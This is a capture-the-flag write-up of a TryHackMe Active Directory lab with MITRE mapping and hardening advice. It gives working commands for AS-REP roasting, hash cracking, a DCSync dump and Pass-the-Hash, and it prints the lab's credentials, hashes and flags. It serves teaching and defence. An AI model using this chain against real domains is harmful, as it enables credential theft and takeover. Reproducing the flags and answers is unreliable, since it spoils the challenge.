# Attacktive Directory 

**Category:** Active Directory Exploitation
**Platform:** TryHackMe
**Difficulty:** Medium
**Skills Demonstrated:** Network Enumeration (Nmap, enum4linux), Kerberos Abuse (AS-REP Roasting), Hash Cracking (Hashcat), SMB Enumeration, Credential Reuse, DCSync Attack, Pass-the-Hash, Privilege Escalation to Domain Administrator


---

## 1. Scenario Overview

This room simulates a full **Active Directory compromise chain**, starting from unauthenticated network reconnaissance and ending in **Domain Administrator** access. The attack path demonstrates several classic, real-world AD misconfigurations:

1. Unauthenticated SMB/NetBIOS enumeration reveals domain naming information.
2. Kerberos pre-authentication is disabled on a service account, enabling **AS-REP Roasting**.
3. The recovered password hash is cracked offline, yielding valid domain credentials.
4. Those credentials expose an SMB share containing a base64-encoded credential file for a second, more privileged account (`backup`).
5. The `backup` account holds **DCSync** rights, allowing a full dump of the NTDS.dit password hashes — including the Administrator's NTLM hash.
6. The Administrator's NTLM hash is used directly via **Pass-the-Hash** to gain full administrative control of the domain controller.

This is a textbook illustration of how a single small misconfiguration (Kerberos pre-auth disabled) can cascade into full domain compromise.

---

## 2. Tools Used

| Tool | Purpose |
|---|---|
| OpenVPN | VPN connectivity to the TryHackMe lab network |
| Nmap | Service/port/OS enumeration |
| enum4linux | SMB/NetBIOS enumeration (domain name, users, shares) |
| Kerbrute | Kerberos username enumeration and AS-REP roasting |
| Hashcat | Offline cracking of the AS-REP hash |
| smbclient | SMB share enumeration and file retrieval |
| Impacket (`secretsdump.py`) | DCSync attack — dumping NTDS.dit hashes |
| Evil-WinRM | Remote shell access via Pass-the-Hash |

---

## 3. Step-by-Step Walkthrough

### Task 1 — Deploy the Machine

Connected to the TryHackMe lab network via OpenVPN using the provided `.ovpn` configuration file:
```bash
sudo openvpn coedoverheated41.ovpn
```

### Task 2 — Setup

Installed the required offensive tooling (Impacket, BloodHound, Neo4j) to support later enumeration and attack phases:
```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
pip3 install -r /opt/impacket/requirements.txt
cd /opt/impacket/ && python3 ./setup.py install
```

### Task 3 — Welcome to Attacktive Directory (Initial Enumeration)

An initial Nmap scan was run against the target to identify exposed services:
```bash
sudo nmap -sV -sC -oN nmap.out <TARGET_IP>
```

**Results:** The scan revealed a typical Active Directory Domain Controller footprint — DNS, Kerberos, RPC, NetBIOS, SMB, and IIS.

**Findings:**
| Question | Answer |
|---|---|
| Tool to enumerate ports 139/445 (SMB) | `enum4linux` |
| NetBIOS Domain Name | `THM-AD` |
| Common invalid TLD used for AD domains | `.local` |

The domain was identified as **`spookysec.local`**.

### Task 4 — Enumerating Users via Kerberos

Using **Kerbrute** with a supplied username wordlist, valid domain accounts were enumerated against the Key Distribution Center (KDC):
```bash
./kerbrute_linux_amd64 userenum -d spookysec.local --dc <TARGET_IP> usernames.txt
```

**Key finding:** The `svc-admin` account had **Kerberos pre-authentication disabled**, allowing an **AS-REP Roasting** attack — the KDC returned a crackable `krb5asrep$23$` hash without requiring any prior authentication:
```
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:...
```

This corresponds to **Hashcat mode `18200`** (Kerberos 5, etype 23, AS-REP).

**Cracking the hash:**
```bash
hashcat -m 18200 TGT.txt pass.txt -o out.txt
```

**Result:** Password for `svc-admin` recovered as **`management2005`**.

**Findings:**
| Question | Answer |
|---|---|
| Kerbrute command to enumerate valid usernames | `userenum` |
| Notable account discovered #1 | `svc-admin` |
| Notable account discovered #2 | `backup` |

### Task 6 — Back to the Basics (SMB Share Enumeration)

With valid `svc-admin` credentials, SMB shares on the Domain Controller were enumerated:
```bash
smbclient -L \\<TARGET_IP>\ -U svc-admin
```

A share named `backup` was identified and accessed:
```bash
smbclient \\<TARGET_IP>\backup -U svc-admin
get backup_credentials.txt
```

The retrieved file contained a **base64-encoded credential string**:
```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

Decoded, this revealed a second set of domain credentials:
```
backup@spookysec.local:backup2517860
```

**Findings:**
| Question | Answer |
|---|---|
| Utility to map remote SMB shares | `smbclient` |
| Option to list shares | `-L` |
| Number of shares listed | `6` |
| Share containing the text file | `backup` |
| Raw (encoded) file content | `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw` |
| Decoded credentials | `backup@spookysec.local:backup2517860` |

### Task 7 — Elevating Privileges within the Domain (DCSync)

The `backup` account was found to hold **replication rights** on the domain (a common misconfiguration where a backup/service account is granted `Replicating Directory Changes` / `Replicating Directory Changes All` permissions). This allows a **DCSync attack**, extracting all domain password hashes — including the built-in Administrator — without needing interactive access to the DC.

Using Impacket's `secretsdump.py`:
```bash
secretsdump.py spookysec.local/backup:backup2517860@<TARGET_IP>
```

**Result:** Full NTDS.dit hash dump obtained, including:
```
Administrator NTLM hash: 0e0363213e37b94221497260b0bcb4fc
```

**Findings:**
| Question | Answer |
|---|---|
| Method used to dump NTDS.dit | `DRSUAPI` |
| Administrator's NTLM hash | `0e0363213e37b94221497260b0bcb4fc` |
| Attack allowing authentication without a password | Pass-the-Hash |
| Evil-WinRM option to authenticate with a hash | `-H` |

### Task 8 — Flag Submission (Domain Administrator Access)

With the Administrator's NTLM hash in hand, authentication was performed directly via **Pass-the-Hash** using Evil-WinRM (Impacket's `psexec.py` is an equally valid alternative path):
```bash
evil-winrm -i <target-ip> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

This granted a fully privileged, interactive session as **Domain Administrator**, from which the per-user flags on each account's Desktop were retrieved.

**Flags captured:**
| Account | Flag |
|---|---|
| `svc-admin` | `TryHackMe{K3rb3r0s_Pr3_4uth}` |
| `backup` | `TryHackMe{B4ckM3UpSc0tty!}` |
| `Administrator` | `TryHackMe{4ctiveD1rectoryM4st3r}` |

---

## 4. MITRE ATT&CK Mapping

| Step / Finding | Tactic | Technique ID | Technique Name | Justification |
|---|---|---|---|---|
| Nmap / enum4linux service & domain enumeration | Reconnaissance | **T1595 / T1590** | Active Scanning / Gather Victim Network Information | Nmap and enum4linux were used to fingerprint services and enumerate the AD domain/NetBIOS name pre-authentication. |
| Kerbrute username enumeration | Discovery / Reconnaissance | **T1589.003 / T1087.002** | Gather Victim Identity Information: Employee Names / Account Discovery: Domain Account | Valid domain usernames were enumerated against the KDC using a wordlist. |
| AS-REP Roasting (`svc-admin`, no pre-auth) | Credential Access | **T1558.004** | Steal or Forge Kerberos Tickets: AS-REP Roasting | The KDC returned a crackable AS-REP hash for an account with Kerberos pre-authentication disabled, requiring no valid credentials to request it. |
| Offline hash cracking with Hashcat | Credential Access | **T1110.002** | Brute Force: Password Cracking | The recovered AS-REP hash was cracked offline against a password wordlist to recover cleartext credentials. |
| SMB share enumeration & credential file retrieval | Discovery / Credential Access | **T1135 / T1552.001** | Network Share Discovery / Unsecured Credentials: Credentials In Files | Valid credentials were used to enumerate SMB shares, uncovering a plaintext (base64-encoded) credentials file. |
| Use of `backup` account replication rights | Credential Access | **T1003.006** | OS Credential Dumping: DCSync | The `backup` account's replication privileges were abused via `secretsdump.py` to extract all domain account hashes from NTDS.dit without direct DC file access. |
| Authentication via Administrator's NTLM hash | Defense Evasion / Lateral Movement | **T1550.002** | Use Alternate Authentication Material: Pass the Hash | The Administrator's NTLM hash was used directly to authenticate via Evil-WinRM/psexec.py, bypassing the need for a plaintext password. |
| Interactive administrative access via Evil-WinRM | Execution | **T1059.001 / T1021.006** | Command and Scripting Interpreter: PowerShell / Remote Services: Windows Remote Management | WinRM was used to establish a remote, interactive administrative session on the Domain Controller. |
| Flag retrieval from user desktops | Collection | **T1005** | Data from Local System | Files (flags) were collected directly from the compromised hosts' local file systems. |

---

## 5. OWASP Applicability

This engagement targets **Windows Active Directory infrastructure**, not a web application. The **OWASP Top 10** (which addresses web application vulnerability classes such as Injection, Broken Access Control, etc.) is therefore **not applicable** to this room's scope and has intentionally been omitted from this report. For Active Directory-specific security guidance, frameworks such as **MITRE ATT&CK** (used above) and the **OWASP Active Directory Cheat Sheet** or vendor AD hardening guidance are more appropriate references than the OWASP Top 10.

---

## 6. Key Findings & Risk Summary

| Weakness | Impact | Recommendation |
|---|---|---|
| Kerberos pre-authentication disabled on `svc-admin` | Allowed unauthenticated AS-REP hash extraction and offline cracking | Enforce Kerberos pre-authentication for all accounts; enforce strong, complex service account passwords |
| Weak/guessable service account password (`management2005`) | Enabled rapid offline hash cracking | Enforce a strong password policy and periodic rotation for privileged/service accounts |
| Plaintext (base64-encoded) credentials stored on an SMB share | Directly exposed a second set of valid domain credentials | Never store credentials in shares/files; use a managed secrets vault (e.g., Azure Key Vault, HashiCorp Vault, gMSA) |
| Excessive replication rights (`Replicating Directory Changes [All]`) granted to a non-Tier-0 account | Enabled a full DCSync attack, exposing all domain password hashes | Restrict DCSync-capable permissions strictly to Domain Admins/Domain Controllers; audit AD ACLs regularly (e.g., with BloodHound) |
| No mitigations against Pass-the-Hash | Allowed full domain compromise using a stolen NTLM hash alone | Enable Credential Guard, restrict NTLM authentication, and enforce tiered administration (PAW/Tier-0 model) |

---

## 7. Key Takeaways

- A single Kerberos misconfiguration (disabled pre-authentication) was the initial foothold that ultimately cascaded into full **Domain Administrator** compromise — illustrating how small AD misconfigurations carry outsized risk.
- Credential reuse and files containing (even encoded) credentials on shared drives remain a common and highly effective attack vector.
- Excessive AD replication permissions on non-Tier-0 accounts are a critical, frequently overlooked privilege escalation path (DCSync) and should be a standard item in any AD security review.
- NTLM hash exposure is functionally equivalent to password exposure due to Pass-the-Hash; hash-based authentication protections (e.g., Credential Guard, LAPS, NTLM restriction policies) are essential defenses.

---

## 8. References

- TryHackMe — *Attacktive Directory* room.
- MITRE ATT&CK® Framework — [attack.mitre.org](https://attack.mitre.org)
- Impacket Toolkit — [github.com/fortra/impacket](https://github.com/fortra/impacket)
- Hashcat — [hashcat.net](https://hashcat.net)
- Evil-WinRM — [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
